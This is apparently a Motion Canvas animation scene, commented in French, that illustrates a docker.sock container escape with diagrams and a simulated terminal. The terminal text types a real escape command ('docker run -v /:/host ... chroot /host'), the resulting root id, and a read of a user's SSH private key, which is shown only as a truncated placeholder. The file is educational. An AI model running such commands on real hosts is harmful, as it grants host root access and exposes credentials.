import {makeScene2D, Layout, Rect, Txt, Grid} from '@motion-canvas/2d';
import {
  createRef,
  all,
  sequence,
  waitFor,
  waitUntil,
  spawn,
  cancel,
} from '@motion-canvas/core';
import {easeInOutCubic} from '@motion-canvas/core/lib/tweening';
import {DiagramNode, DiagramEdge, Zone, Terminal, Packet} from '../../components';
import {PALETTE} from '../../theme';

export default makeScene2D(function* (view) {
  const vW = () => view.width();
  const vH = () => view.height();

  // ── Refs ──────────────────────────────────────────────────────────────────
  const gridRef             = createRef<Grid>();
  const titleRef            = createRef<Txt>();
  const hostZoneRef         = createRef<Zone>();
  const containerZoneRef    = createRef<Zone>();
  const dockerDaemonRef     = createRef<DiagramNode>();
  const socketFileRef       = createRef<DiagramNode>();
  const fsEtcRef            = createRef<DiagramNode>();
  const fsRootRef           = createRef<DiagramNode>();
  const fsHomeRef           = createRef<DiagramNode>();
  const fsVarRef            = createRef<DiagramNode>();
  const ubuntuContainerRef  = createRef<DiagramNode>();
  const escapeContainerRef  = createRef<DiagramNode>();
  const dockerFlowPacketRef = createRef<Packet>();
  const attackPacketRef     = createRef<Packet>();
  const socketMountEdgeRef  = createRef<DiagramEdge>();
  const mountEtcEdgeRef     = createRef<DiagramEdge>();
  const mountRootEdgeRef    = createRef<DiagramEdge>();
  const mountHomeEdgeRef    = createRef<DiagramEdge>();
  const mountVarEdgeRef     = createRef<DiagramEdge>();
  const terminalRef         = createRef<Terminal>();

  // ── Scène ─────────────────────────────────────────────────────────────────
  view.add(
    <Layout key="root" width={'100%'} height={'100%'}>
      <Rect key="bg" width={'100%'} height={'100%'} fill={PALETTE.bg} />

      {/* — Grille de fond — */}
      <Grid
        key="bg-grid"
        ref={gridRef}
        width={'100%'}
        height={'100%'}
        spacing={() => vW() * 0.04}
        stroke={PALETTE.cream + '15'}
        lineWidth={1}
        opacity={0}
      />

      {/* — Titre — */}
      <Txt
        key="scene-title"
        ref={titleRef}
        text="docker.sock escape"
        fill={PALETTE.rose}
        fontSize={() => vW() * 0.022}
        fontFamily={'Space Grotesk, DM Sans, sans-serif'}
        fontWeight={700}
        x={0}
        y={() => vH() * -0.46}
        opacity={0}
      />

      {/* — Zones — */}
      <Zone
        key="host-zone"
        ref={hostZoneRef}
        preset="trusted"
        label="HOST"
        width={() => vW() * 0.38}
        height={() => vH() * 0.62}
        x={() => vW() * -0.28}
        y={() => vH() * -0.08}
        opacity={0}
      />
      <Zone
        key="container-zone"
        ref={containerZoneRef}
        preset="sandbox"
        label="CONTAINER"
        width={() => vW() * 0.36}
        height={() => vH() * 0.62}
        x={() => vW() * 0.30}
        y={() => vH() * -0.08}
        opacity={0}
      />

      {/* — Docker Daemon — à l'interface entre les deux zones — */}
      <DiagramNode
        key="docker-daemon"
        ref={dockerDaemonRef}
        preset="server"
        iconName="logos:docker-icon"
        label="Docker Daemon"
        sublabel="dockerd"
        color={PALETTE.cyan}
        width={() => vW() * 0.155}
        height={() => vH() * 0.18}
        x={0}
        y={() => vH() * -0.30}
        opacity={0}
      />

      {/* — docker.sock — plus petit, dans la zone host — */}
      <DiagramNode
        key="socket-file"
        ref={socketFileRef}
        preset="file"
        label="docker.sock"
        sublabel="unix socket"
        color={PALETTE.secondary}
        width={() => vW() * 0.115}
        height={() => vH() * 0.088}
        x={() => vW() * -0.28}
        y={() => vH() * -0.11}
        opacity={0}
      />

      {/* — Filesystem host — grille 2×2 dans la zone host — */}
      <DiagramNode
        key="fs-etc"
        ref={fsEtcRef}
        preset="file"
        iconName="mdi:folder-cog-outline"
        label="/etc"
        color={PALETTE.cream}
        width={() => vW() * 0.105}
        height={() => vH() * 0.085}
        x={() => vW() * -0.36}
        y={() => vH() * 0.03}
        opacity={0}
      />
      <DiagramNode
        key="fs-root"
        ref={fsRootRef}
        preset="file"
        iconName="mdi:folder-account-outline"
        label="/root"
        color={PALETTE.cream}
        width={() => vW() * 0.105}
        height={() => vH() * 0.085}
        x={() => vW() * -0.21}
        y={() => vH() * 0.03}
        opacity={0}
      />
      <DiagramNode
        key="fs-home"
        ref={fsHomeRef}
        preset="file"
        iconName="mdi:home-outline"
        label="/home"
        color={PALETTE.cream}
        width={() => vW() * 0.105}
        height={() => vH() * 0.085}
        x={() => vW() * -0.36}
        y={() => vH() * 0.14}
        opacity={0}
      />
      <DiagramNode
        key="fs-var"
        ref={fsVarRef}
        preset="file"
        iconName="mdi:database-outline"
        label="/var"
        color={PALETTE.cream}
        width={() => vW() * 0.105}
        height={() => vH() * 0.085}
        x={() => vW() * -0.21}
        y={() => vH() * 0.14}
        opacity={0}
      />

      {/* — Ubuntu (docker.sock monté) — dans la zone container — */}
      <DiagramNode
        key="ubuntu-container"
        ref={ubuntuContainerRef}
        preset="container"
        iconName="devicon:ubuntu"
        label="ubuntu"
        sublabel="-v docker.sock"
        color={PALETTE.rose}
        initialState="error"
        width={() => vW() * 0.14}
        height={() => vH() * 0.165}
        x={() => vW() * 0.30}
        y={() => vH() * -0.27}
        opacity={0}
      />

      {/* — Escape container — spawné pendant l'attaque — */}
      <DiagramNode
        key="escape-container"
        ref={escapeContainerRef}
        preset="container"
        iconName="devicon:ubuntu"
        label="ubuntu"
        sublabel="-v /:/host"
        color={PALETTE.rose}
        initialState="error"
        width={() => vW() * 0.14}
        height={() => vH() * 0.13}
        x={() => vW() * 0.30}
        y={() => vH() * -0.03}
        opacity={0}
      />

      {/* — Packets — */}
      <Packet
        key="docker-flow-packet"
        ref={dockerFlowPacketRef}
        content="API"
        color={PALETTE.cyan}
        packetSize="sm"
        width={() => vW() * 0.065}
        height={() => vH() * 0.038}
        opacity={0}
      />
      <Packet
        key="attack-packet"
        ref={attackPacketRef}
        content="docker run"
        color={PALETTE.rose}
        packetSize="sm"
        width={() => vW() * 0.09}
        height={() => vH() * 0.038}
        opacity={0}
      />

      {/* — Socket mount edge — docker.sock → ubuntu container — */}
      <DiagramEdge
        key="socket-mount-edge"
        ref={socketMountEdgeRef}
        from={() => [vW() * -0.222, vH() * -0.11]}
        to={() =>   [vW() *  0.228, vH() * -0.27]}
        edgeDirection="uni"
        edgeStyle="dashed"
        label="unix socket"
        stroke={PALETTE.rose}
        end={0}
        opacity={0}
      />

      {/* — Mount edges — escape container → nœuds filesystem — */}
      <DiagramEdge
        key="mount-etc-edge"
        ref={mountEtcEdgeRef}
        from={() => [vW() * 0.228, vH() * -0.04]}
        to={() =>   [vW() * -0.36, vH() *  0.03]}
        edgeDirection="uni"
        edgeStyle="animated"
        stroke={PALETTE.rose}
        end={0}
        opacity={0}
      />
      <DiagramEdge
        key="mount-root-edge"
        ref={mountRootEdgeRef}
        from={() => [vW() * 0.228, vH() * -0.04]}
        to={() =>   [vW() * -0.21, vH() *  0.03]}
        edgeDirection="uni"
        edgeStyle="animated"
        stroke={PALETTE.rose}
        end={0}
        opacity={0}
      />
      <DiagramEdge
        key="mount-home-edge"
        ref={mountHomeEdgeRef}
        from={() => [vW() * 0.228, vH() * -0.02]}
        to={() =>   [vW() * -0.36, vH() *  0.14]}
        edgeDirection="uni"
        edgeStyle="animated"
        stroke={PALETTE.rose}
        end={0}
        opacity={0}
      />
      <DiagramEdge
        key="mount-var-edge"
        ref={mountVarEdgeRef}
        from={() => [vW() * 0.228, vH() * -0.02]}
        to={() =>   [vW() * -0.21, vH() *  0.14]}
        edgeDirection="uni"
        edgeStyle="animated"
        stroke={PALETTE.rose}
        end={0}
        opacity={0}
      />

      {/* — Terminal — */}
      <Terminal
        key="terminal"
        ref={terminalRef}
        title="root@ubuntu — bash"
        fontSize={() => vW() * 0.013}
        width={() => vW() * 0.88}
        height={() => vH() * 0.28}
        x={0}
        y={() => vH() * 0.35}
        maxLines={6}
        opacity={0}
      />
    </Layout>
  );

  // ── Phase 1 — Setup: hôte + daemon + filesystem ───────────────────────────
  yield* waitUntil('showHost');
  yield* all(
    gridRef().opacity(0.12, 0.6),
    titleRef().opacity(1, 0.5),
    hostZoneRef().opacity(1, 0.4),
    sequence(0.15,
      dockerDaemonRef().opacity(1, 0.3),
      socketFileRef().opacity(1, 0.3),
      sequence(0.07,
        fsEtcRef().opacity(1, 0.25),
        fsRootRef().opacity(1, 0.25),
        fsHomeRef().opacity(1, 0.25),
        fsVarRef().opacity(1, 0.25),
      ),
    ),
  );

  // ── Phase 2 — Zone container (vide) ──────────────────────────────────────
  yield* waitUntil('showContainer');
  yield* containerZoneRef().opacity(1, 0.4);

  // ── Phase 3 — Flux Docker légitime : socket → daemon → ubuntu ────────────
  // Montre comment dockerd instancie un container via docker.sock
  yield* waitUntil('showDockerFlow');

  dockerFlowPacketRef().position([vW() * -0.28, vH() * -0.11]);
  yield* dockerFlowPacketRef().opacity(1, 0.15);
  yield* dockerFlowPacketRef().flyTo([0, vH() * -0.30], 0.5);
  yield* waitFor(0.08);
  yield* dockerFlowPacketRef().flyTo([vW() * 0.30, vH() * -0.27], 0.45);
  yield* all(
    dockerFlowPacketRef().opacity(0, 0.15),
    ubuntuContainerRef().opacity(1, 0.35),
  );

  // Edge tiretée : docker.sock → ubuntu (mount persistant visible)
  socketMountEdgeRef().opacity(1);
  yield* socketMountEdgeRef().end(1, 0.4, easeInOutCubic);

  // ── Phase 4 — Attaque : ubuntu → socket → daemon → escape container ───────
  yield* waitUntil('showAttack');
  yield* terminalRef().opacity(1, 0.4);

  const blinkTask = yield terminalRef().startBlink();

  yield* waitUntil('attackCommand');
  yield* terminalRef().typewrite(
    'docker run -v /:/host -it ubuntu chroot /host',
    {prompt: true, charDelay: 0.032},
  );
  cancel(blinkTask);

  // Packet trace le chemin complet : ubuntu → socket → daemon → escape
  attackPacketRef().position([vW() * 0.30, vH() * -0.27]);
  yield* attackPacketRef().opacity(1, 0.15);
  yield* attackPacketRef().flyTo([vW() * -0.28, vH() * -0.11], 0.55);
  yield* waitFor(0.07);
  yield* attackPacketRef().flyTo([0, vH() * -0.30], 0.45);
  yield* waitFor(0.07);
  yield* attackPacketRef().flyTo([vW() * 0.30, vH() * -0.03], 0.45);
  yield* all(
    attackPacketRef().opacity(0, 0.15),
    escapeContainerRef().opacity(1, 0.35),
  );

  // ── Phase 5 — Mount : escape container → filesystem ─────────────────────
  yield* waitUntil('showMount');

  // Toutes les flèches de mount se tracent simultanément
  mountEtcEdgeRef().opacity(1);
  mountRootEdgeRef().opacity(1);
  mountHomeEdgeRef().opacity(1);
  mountVarEdgeRef().opacity(1);
  yield* all(
    mountEtcEdgeRef().end(1, 0.55, easeInOutCubic),
    mountRootEdgeRef().end(1, 0.55, easeInOutCubic),
    mountHomeEdgeRef().end(1, 0.55, easeInOutCubic),
    mountVarEdgeRef().end(1, 0.55, easeInOutCubic),
  );

  spawn(mountEtcEdgeRef().animateDash());
  spawn(mountRootEdgeRef().animateDash());
  spawn(mountHomeEdgeRef().animateDash());
  spawn(mountVarEdgeRef().animateDash());

  // Zone host + tous les nœuds passent en état "error"
  yield* all(
    hostZoneRef().fill(PALETTE.rose + '1A', 0.4),
    hostZoneRef().stroke(PALETTE.rose + 'CC', 0.4),
    dockerDaemonRef().setState('error', 0.15),
    socketFileRef().setState('error', 0.15),
    fsEtcRef().setState('error', 0.2),
    fsRootRef().setState('error', 0.2),
    fsHomeRef().setState('error', 0.2),
    fsVarRef().setState('error', 0.2),
  );

  yield* waitUntil('attackOutput');
  const finalBlinkTask = yield terminalRef().startBlink();
  yield* terminalRef().typewrite('# id', {prompt: true, charDelay: 0.06});
  yield* terminalRef().typewrite(
    "uid=0(root) gid=0(root)  ← root sur l'hôte",
    {color: 'rose'},
  );

  yield* waitUntil('catCommand');
  yield* terminalRef().typewrite(
    'cat /host/home/alex/.ssh/id_rsa',
    {prompt: true, charDelay: 0.04},
  );
  yield* terminalRef().typewrite(
    '-----BEGIN OPENSSH PRIVATE KEY-----',
    {color: 'danger'},
  );
  yield* terminalRef().typewrite(
    'b3BlbnNzaC1rZXktdjEAAAAA [...] AAAAB3NzaC1yc2EAAA==',
    {color: 'danger'},
  );
  yield* terminalRef().typewrite(
    '-----END OPENSSH PRIVATE KEY-----',
    {color: 'danger'},
  );
  cancel(finalBlinkTask);

  yield* waitFor(1.5);

  // ── Fin ───────────────────────────────────────────────────────────────────
  yield* waitUntil('end');
  yield* all(
    gridRef().opacity(0, 0.4),
    titleRef().opacity(0, 0.3),
    hostZoneRef().opacity(0, 0.4),
    containerZoneRef().opacity(0, 0.4),
    dockerDaemonRef().opacity(0, 0.3),
    socketFileRef().opacity(0, 0.3),
    fsEtcRef().opacity(0, 0.25),
    fsRootRef().opacity(0, 0.25),
    fsHomeRef().opacity(0, 0.25),
    fsVarRef().opacity(0, 0.25),
    ubuntuContainerRef().opacity(0, 0.3),
    escapeContainerRef().opacity(0, 0.3),
    socketMountEdgeRef().opacity(0, 0.3),
    mountEtcEdgeRef().opacity(0, 0.3),
    mountRootEdgeRef().opacity(0, 0.3),
    mountHomeEdgeRef().opacity(0, 0.3),
    mountVarEdgeRef().opacity(0, 0.3),
    terminalRef().opacity(0, 0.3),
  );
});
